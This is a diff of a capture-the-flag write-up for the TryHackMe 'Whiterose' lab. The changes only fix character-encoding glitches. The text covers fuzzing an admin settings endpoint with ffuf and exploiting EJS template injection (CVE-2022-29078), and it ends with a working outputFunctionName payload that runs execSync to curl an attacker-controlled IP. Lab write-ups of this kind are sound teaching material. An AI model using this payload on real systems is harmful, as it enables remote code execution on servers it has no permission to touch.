@@ -77,9 +77,9 @@ Seems like we can change users passwords , let's begin with exploitation
 
 Explanation is a bit long, but here is a little summary of it:
 
-Testing theÂ `name`Â andÂ `password`Â parameters for vulnerabilities likeÂ **SQL**Â orÂ **SSTI**, we do not find anything. So, letâ€™s fuzz for any other parameters theÂ `/settings`Â endpoint might accept.
+Testing the`name` and`password` parameters for vulnerabilities like **SQL** or **SSTI**, we do not find anything. So, letâ€™s fuzz for any other parameters the`/settings` endpoint might accept.
 
-UsingÂ **ffuf**Â for this, we discover a couple of interesting parameters:
+Using **ffuf** for this, we discover a couple of interesting parameters:
 
 ```ad-hint
 `ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AMwjzKA3EcBUXIsqGNDDaHARGh5B7JYwk.jwhk7KbGBNbC46HXtU8Ln%2BqMzdigbh1ZTMDnal6RC24' -mc all -d 'name=test&password=test&FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098<br>`
@@ -87,37 +87,37 @@ UsingÂ **ffuf**Â for this, we discover a couple of interesting parameters:
 #### OUTPUT
 
 ```
-While theÂ `error`Â andÂ `message`Â parameters simply cause the server to include their values in the response, theÂ `include`,Â `client`, andÂ `async`Â parameters are more interesting.
+While the`error` and`message` parameters simply cause the server to include their values in the response, the`include`,`client`, and`async` parameters are more interesting.
 
-When theÂ `include`Â andÂ `client`Â parameters are present, the server returns aÂ **500**Â response with an error like this:
+When the`include` and`client` parameters are present, the server returns a **500** response with an error like this:
 
 [![Web 80 Admin Settings Four](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings4.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings4.webp)
 
 ```ad-note
-`TypeError: /home/web/app/views/settings.ejs:4<br>    2\| <html lang="en"><br>    3\|   <head><br> >> 4\|     <%- include("../components/head"); %><br>    5\|     <title>Cyprus National Bank</title><br>    6\|   </head><br>    7\|   <body><br>
+`TypeError: /home/web/app/views/settings.ejs:4<br> 2\| <html lang="en"><br> 3\| <head><br> >> 4\| <%- include("../components/head"); %><br> 5\| <title>Cyprus National Bank</title><br> 6\| </head><br> 7\| <body><br>
 include is not a function
-<br>    at eval ("/home/web/app/views/settings.ejs":12:17)<br>    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)<br>    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br>    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br>    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br>    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br>    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br>    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br>    a/home/web/app/routes/settings.js:27:7    at runMicrotasks (<anonymous>)`
+<br> at eval ("/home/web/app/views/settings.ejs":12:17)<br> at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)<br> at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br> at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br> at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br> at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br> at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br> at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br> a/home/web/app/routes/settings.js:27:7 at runMicrotasks (<anonymous>)`
 ````
 
-And when we use theÂ `async`Â parameter, we simply receiveÂ `{}`Â in the response.
+And when we use the`async` parameter, we simply receive`{}` in the response.
 
 [![Web 80 Admin Settings Five](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings5.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings5.webp)
 
-From the error, we learn that the application usesÂ **EJS**Â as a template engine. If the application directly passes our request body to theÂ `render`Â function as theÂ `data`Â argument, this could lead to anÂ **SSTI**Â vulnerability. This is becauseÂ **EJS**Â allows certain options, such asÂ `client`Â andÂ `async`, to be included in the same argument as the data. Notably, the fact that theÂ `client`Â option causes an error and using theÂ `async`Â option results in the server responding with onlyÂ `{}`Â suggests that this might be the case here.
+From the error, we learn that the application uses **EJS** as a template engine. If the application directly passes our request body to the`render` function as the`data` argument, this could lead to an **SSTI** vulnerability. This is because **EJS** allows certain options, such as`client` and`async`, to be included in the same argument as the data. Notably, the fact that the`client` option causes an error and using the`async` option results in the server responding with only`{}` suggests that this might be the case here.
 
-We can try to confirm this by using theÂ `delimiter`Â option, which is also one of the options allowed to be passed along with data. By default, it is set toÂ `%`. If we change it to a string that does not exist in the template, we should be able to leak the template.
+We can try to confirm this by using the`delimiter` option, which is also one of the options allowed to be passed along with data. By default, it is set to`%`. If we change it to a string that does not exist in the template, we should be able to leak the template.
 
 Testing our theory, we find that we are correct, as we successfully leak the template.
 
 [![Web 80 Admin Settings Six](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings6.webp)](https://jaxafed.github.io/images/tryhackme_whiterose/web_80_admin_settings6.webp)
 
-As I mentioned before, there are only a limited number of options allowed to be passed along with data. However, this is where theÂ `CVE-2022-29078`Â vulnerability comes into play. By using theÂ `settings['view options']`Â parameter, we are able to pass any option without limitation.
+As I mentioned before, there are only a limited number of options allowed to be passed along with data. However, this is where the`CVE-2022-29078` vulnerability comes into play. By using the`settings['view options']` parameter, we are able to pass any option without limitation.
 
-And there are certain options, likeÂ `outputFunctionName`, that are used byÂ **EJS**Â without any filtration to build the template body, allowing us to inject code it.
+And there are certain options, like`outputFunctionName`, that are used by **EJS** without any filtration to build the template body, allowing us to inject code it.
 
-You can find more information about the vulnerability and theÂ **PoC**Â [here in this article](https://eslam.io/posts/ejs-server-side-template-injection-rce/).
+You can find more information about the vulnerability and the **PoC** [here in this article](https://eslam.io/posts/ejs-server-side-template-injection-rce/).
 
-Testing theÂ **PoC**Â payload from the article, we find that it works, as we receive a request on our server.
+Testing the **PoC** payload from the article, we find that it works, as we receive a request on our server.
 
 `settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22');s|`
 
